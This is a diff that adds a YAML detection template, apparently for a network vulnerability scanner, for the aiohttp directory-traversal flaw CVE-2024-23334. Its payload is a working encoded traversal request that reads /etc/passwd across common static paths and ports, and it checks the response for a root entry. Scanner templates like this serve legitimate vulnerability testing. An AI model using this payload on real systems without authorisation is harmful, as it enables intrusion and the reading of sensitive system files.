@@ -1,0 +1,55 @@
+info:
+  name: aiohttp_cve_2024_23334_vuln
+  author: Sankalp Bansal
+  severity: 7.5
+  description: aiohttp Directory Traversal (CVE-2024-23334) allowing arbitrary file read in versions 1.0.5 < v < 3.9.2
+  references:
+    - https://nvd.nist.gov/vuln/detail/cve-2024-23334
+    - https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f
+  profiles:
+    - vuln
+    - http
+    - high_severity
+    - cve
+    - cve2024
+    - aiohttp
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              paths:
+                - "assets"
+                - "images"
+                - "public"
+                - "resources"
+                - "static"
+                - "media"
+                - "uploads"
+                - "build"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "root:.*:0:0:"
+              reverse: false
